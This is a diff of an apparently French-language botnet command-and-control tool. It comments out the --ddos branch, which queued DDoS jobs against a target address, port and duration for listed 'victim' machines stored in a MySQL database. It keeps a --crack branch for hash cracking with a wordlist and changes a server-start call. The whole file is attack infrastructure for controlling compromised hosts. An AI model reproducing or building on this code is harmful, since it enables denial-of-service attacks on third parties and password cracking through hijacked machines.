@@ -126,40 +126,40 @@ db = mysql.connector.connect(
 mycursor = db.cursor()
 
 
-if args.ddos:
-    if not args.address or not args.time or not args.port:
-        logger.error("--ddos nécessite les arguments --address, --time et --port")
-        parser.error("--ddos nécessite les arguments --address, --time et --port")
+# if args.ddos:
+#     if not args.address or not args.time or not args.port:
+#         logger.error("--ddos nécessite les arguments --address, --time et --port")
+#         parser.error("--ddos nécessite les arguments --address, --time et --port")
 
-    elif not args.host:
-        logger.error("--ddos nécessite l'argument --host")
-        parser.error("--ddos nécessite l'argument --host")
-    elif args.host:
-        try:
-            for victim in args.host.split(","):
-                query = "SELECT id FROM victims WHERE uid = %s"
-                values = (victim, )
-                mycursor.execute(query, values)
+#     elif not args.host:
+#         logger.error("--ddos nécessite l'argument --host")
+#         parser.error("--ddos nécessite l'argument --host")
+#     elif args.host:
+#         try:
+#             for victim in args.host.split(","):
+#                 query = "SELECT id FROM victims WHERE uid = %s"
+#                 values = (victim, )
+#                 mycursor.execute(query, values)
 
-                result = mycursor.fetchall()
-                for id in result:
-                    query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-                    values = (id[0], "ddos", "pending", "{\"arg1\": \"" + str(args.address) + "\", \"arg2\": \"" + str(args.port) + "\", \"arg3\":  \"" + str(args.time) + "\"}")
-                    mycursor.execute(query, values)
-            logger.info("attack:ddos, address:" + args.address + ", port:" + str(args.port) + ", time:" + str(args.time) + ", host:"+ args.host)
-        except mysql.connector.ProgrammingError as e:
-            logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque ddos dans la base de données")
-        except mysql.connector.Error as e:
-            logger.error("Erreur lors de l'insertion de l'attaque ddos dans la base de données")
+#                 result = mycursor.fetchall()
+#                 for id in result:
+#                     query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+#                     values = (id[0], "ddos", "pending", "{\"arg1\": \"" + str(args.address) + "\", \"arg2\": \"" + str(args.port) + "\", \"arg3\":  \"" + str(args.time) + "\"}")
+#                     mycursor.execute(query, values)
+#             logger.info("attack:ddos, address:" + args.address + ", port:" + str(args.port) + ", time:" + str(args.time) + ", host:"+ args.host)
+#         except mysql.connector.ProgrammingError as e:
+#             logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque ddos dans la base de données")
+#         except mysql.connector.Error as e:
+#             logger.error("Erreur lors de l'insertion de l'attaque ddos dans la base de données")
 
-    else:
-        parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")
+#     else:
+#         parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")
 
 # arg 1 : ip # arg2 : port # arg3 : time  
 ############################################################
 
 
-elif args.crack:
+if args.crack:
     if not args.hash or not args.wordlist:
         logger.error("--crack nécessite les arguments --hash et --wordlist")
         parser.error("--crack nécessite les arguments --hash et --wordlist")
@@ -745,7 +745,7 @@ elif args.start:
         parser.error("--start nécessite l'argument --port compris entre 1023 et 65535")
     else:
         try:
-            start_server(args.port)
+            start_server(args.port, logger)
             print("démarrage du serveur sur le port " + str(args.port))
             logger.info("démarrage du serveur sur le port " + str(args.port))
         except:
